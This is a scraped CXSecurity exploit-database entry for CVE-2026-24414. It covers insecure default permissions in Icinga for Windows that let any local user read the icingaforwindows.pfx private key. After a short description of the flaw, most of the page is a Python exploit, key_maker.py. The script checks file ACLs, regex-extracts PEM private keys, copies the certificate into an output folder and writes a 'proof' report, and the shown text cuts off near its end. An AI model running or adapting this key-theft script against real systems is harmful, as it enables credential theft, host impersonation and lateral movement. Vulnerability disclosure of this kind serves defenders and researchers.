---
title: Icinga for Windows 1.13.3 - 'key_maker.py' Incorrect Default Permissions Private Key Exposure
url: https://cxsecurity.com/issue/WLB-2026020033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-26
fetch_date: 2026-02-27T04:06:58.129900
---

# Icinga for Windows 1.13.3 - 'key_maker.py' Incorrect Default Permissions Private Key Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Icinga for Windows 1.13.3 - 'key\_maker.py' Incorrect Default Permissions Private Key Exposure** **2026.02.26**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2026-24414](https://cxsecurity.com/cveshow/CVE-2026-24414/ "Click to see CVE-2026-24414")**  CWE: **N/A** | |

# Exploit Title: Icinga for Windows 1.13.3 - 'key\_maker.py' Incorrect Default Permissions Private Key Exposure
# Date: 2026-02-23
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://icinga.com/
# Software Link: https://github.com/Icinga/icinga-powershell-framework/releases/tag/v1.13.3
# Version: Icinga PowerShell Framework < 1.13.4, < 1.12.4, < 1.11.2
# Tested on: Windows 11 25H2
# CVE: CVE-2026-24414
# Exploit Repository: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-24414
## Description
Icinga for Windows PowerShell Framework versions prior to 1.13.4, 1.12.4, and 1.11.2 install the certificate directory with insecure default permissions. The directory `C:\Program Files\WindowsPowerShell\Modules\icinga-powershell-framework\certificate` is created with `BUILTIN\Users:(RX)` permissions, allowing ANY local user to read the `icingaforwindows.pfx` certificate file containing the private key.
This vulnerability leads to complete exposure of the Icinga private key, enabling attackers to:
- Impersonate the monitored host
- Decrypt Icinga monitoring traffic
- Use the stolen certificate for authentication to other systems
- Perform lateral movement within the network
## Exploit Repository
The full exploit code, including `key\_maker.py` and additional testing scripts, is available at:
🔗 \*\*https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-24414\*\*
## Proof of Concept - key\_maker.py
The following Python exploit, named `key\_maker.py`, demonstrates that any standard user can read and extract the private key:
```python
#!/usr/bin/env python3
"""
key\_maker.py - CVE-2026-24414 Exploit
Icinga for Windows Private Key Maker (Public Edition)
Author: nu11secur1ty
Repository: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-24414
Usage: python key\_maker.py --go
"""
import os
import subprocess
import shutil
import getpass
import re
import hashlib
from pathlib import Path
from datetime import datetime
import argparse
# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'
CHECK = "[+]"
CROSS = "[-]"
WARN = "[!]"
INFO = "[\*]"
class IcingaKeyExploit:
def \_\_init\_\_(self):
self.username = getpass.getuser()
self.computer = os.environ.get('COMPUTERNAME', 'UNKNOWN')
self.cert\_dir = Path(r"C:\Program Files\WindowsPowerShell\Modules\icinga-powershell-framework\certificate")
self.cert\_file = self.cert\_dir / "icingaforwindows.pfx"
self.timestamp = datetime.now().strftime('%Y%m%d\_%H%M%S')
self.output\_dir = Path.cwd() / f"icinga\_exposed\_{self.timestamp}"
def banner(self):
print(f"""
{BLUE}╔══════════════════════════════════════════════════════════╗
║ key\_maker.py - CVE-2026-24414 ║
║ Icinga for Windows Private Key Exposure ║
║ Author: nu11secur1ty ║
║ Repo: github.com/nu11secur1ty/CVE-mitre ║
║ Current user: {self.username}@{self.computer}{' ' \* (10 - len(self.username + self.computer))}║
╚══════════════════════════════════════════════════════════╝{RESET}
""")
def check\_access(self):
"""Verify we can read the certificate"""
print(f"{CYAN}{INFO} Checking access to certificate...{RESET}")
if not self.cert\_file.exists():
print(f"{RED}{CROSS} Certificate not found{RESET}")
return False
try:
with open(self.cert\_file, 'rb') as f:
f.read(10)
size = self.cert\_file.stat().st\_size
print(f"{GREEN}{CHECK} CAN READ certificate ({size} bytes){RESET}")
return True
except:
print(f"{RED}{CROSS} Cannot read certificate{RESET}")
return False
def check\_permissions(self):
"""Check file permissions"""
try:
result = subprocess.run(['icacls', str(self.cert\_file)], capture\_output=True, text=True)
print(f"{WHITE}{result.stdout}{RESET}")
if 'BUILTIN\\Users' in result.stdout and '(RX)' in result.stdout:
print(f"{RED}{WARN} VULNERABLE: BUILTIN\\Users has read access{RESET}")
return True
except:
pass
return False
def extract\_private\_key(self):
"""Extract private key from certificate"""
with open(self.cert\_file, 'rb') as f:
raw\_data = f.read()
try:
text\_data = raw\_data.decode('utf-8', errors='ignore')
pattern = r'-----BEGIN.\*PRIVATE KEY-----.\*?-----END.\*PRIVATE KEY-----'
keys = re.findall(pattern, text\_data, re.DOTALL)
if keys:
for i, key in enumerate(keys, 1):
key\_file = self.output\_dir / f"private\_key\_pem\_{i}.key"
with open(key\_file, 'w') as f:
f.write(key)
print(f"{GREEN}{CHECK} Private key saved: {key\_file}{RESET}")
print(f"{CYAN}Preview:{RESET} {key[:100]}...")
else:
print(f"{YELLOW}{WARN} No PEM key found - binary certificate saved{RESET}")
except:
pass
# Save original
shutil.copy2(self.cert\_file, self.output\_dir / "original\_certificate.pfx")
def create\_proof(self):
"""Create proof report"""
proof = self.output\_dir / "PROOF.txt"
with open(proof, 'w') as f:
f.write(f"CVE-2026-24414 EXPLOIT SUCCESS\n")
f.write(f"Date: {datetime.now()}\n")
f.write(f"User: {self.username}@{self.computer}\n")
f.write(f"Certificate: {self.cert\_file}\n")
f.write(f"Permissions: BUILTIN\\Users:(RX) - VULNERABLE\n")
f.write("Private Key: EXTRACTED\n")
f.write("Impact: ANY local user can steal this key\n")
f.write(f"Repository: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-24414\n")
print(f"{GREEN}{CHECK} Proof: {proof}{RESET}")
def exploit(self):
self.banner()
self.output\_dir.mkdir(exist\_ok=True)
if not self.check\_access():
return
self.check\_permissions()
self.extract\_private\_key()
self.create\_proof()
print(f"\n{RED}{'='\*60}{RESET}")
print(f"{RED}CVE-2026-24414 - PRIVATE KEY EXPOSED!{RESET}")
print(f"{RED}{'='\*60}{RESET}")
print(f"\nFiles saved to: {self.output\_dir}")
print(f"\n{YELLOW}ANY USER on this system can steal this key!{RESET}")
print(f"\n{CYAN}Exploit Repository:{RESET}")
print(f"ht...